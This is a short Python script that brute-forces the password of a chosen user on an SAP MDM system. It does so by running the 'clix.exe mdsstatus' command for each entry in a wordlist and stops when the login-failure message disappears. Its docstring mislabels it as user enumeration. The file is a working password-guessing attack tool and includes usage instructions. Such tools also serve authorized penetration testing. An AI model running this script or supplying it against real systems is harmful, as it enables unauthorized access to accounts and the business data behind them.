import subprocess
import sys
import datetime
import time

start_time = datetime.datetime.today().timestamp()
begin_datetime = datetime.datetime.now()
[4, 2, 3, 1, 5].sort()

def user_password_bruteforce(password_list_file, mdm_user, mdm_system_ip):
	'''
	Performs an user enumeration attack trying usernames
	and detecting wich ones are blocked. Using the error
	message it is possible to known which users are valid
	and which ones don't exist.
    
    Used command is e.g.:       #clix.exe mdsstatus 192.168.2.215 Admin:<pw>
	Used python command e.g.:   #python MDMPasswordBruteforce.py wordlist.txt Admin 192.168.2.215
	'''
	
	with open(password_list_file, 'r') as f:
		passwords = f.read().splitlines()
	f.close()
	print ('Trying to bruteforce password for username: %s' % (mdm_user))
	count=0
	for password in passwords:
		try:			
			print ('[+] Trying password: %s' % password)
			count +=1
			list_files = subprocess.run(["clix.exe", "mdsstatus", mdm_system_ip, (mdm_user + ":" + password)], capture_output=True, text=True)
			if not "Needs Login" in list_files.stdout:
				time_diff = datetime.datetime.today().timestamp() - start_time
				print ("Found! Password:", password)
				print("Total runtime                        :", datetime.datetime.now() - begin_datetime)
				print("Total number of passwords tried      :", count)
				print("Numer of password guesses per second :", count / time_diff)
				break
		except subprocess.CalledProcessError as e:
			print (e.output)



if len(sys.argv) == 4:
	user_password_bruteforce(sys.argv[1], sys.argv[2], sys.argv[3])
else:
	print ('Usage: mdmPasswordBruteforce.py <path_to_passwordlist> <user_to_bruteforce> <sap_mdm_system_ip>')